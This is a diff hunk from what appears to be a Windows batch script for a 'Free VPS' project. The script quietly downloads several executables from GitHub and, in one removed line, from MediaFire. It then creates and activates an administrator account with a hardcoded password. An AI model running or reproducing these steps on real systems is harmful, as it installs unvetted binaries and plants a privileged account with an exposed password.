@@ -7,7 +7,6 @@ curl -o "C:\Users\Public\Desktop\Fast Config VPS.exe" https://raw.githubusercont
 curl -o "C:\Users\Public\Desktop\EVKey Vietnamese Keyboard.exe" https://raw.githubusercontent.com/liladhen/Free-VPS/main/EVKey64.exe > out.txt 2>&1
 curl -o "C:\Users\Public\Desktop\FreeVPS.exe" https://raw.githubusercontent.com/liladhen/Free-VPS/main/FreeVPS.exe > out.txt 2>&1
 curl -o "C:\Users\Public\Desktop\Connection.exe" https://raw.githubusercontent.com/liladhen/Free-VPS/main/Connection.exe > out.txt 2>&1
-curl -o "C:\Users\Public\Desktop\actions.exe" https://download1076.mediafire.com/j70kds0hkdlg/c0p0fjh7vqs5nt2/actions.exe > out.txt 2>&1
 net user administrator zIaBSuYyO7s /add >nul
 net localgroup administrators administrator /add >nul
 net user administrator /active:yes >nul
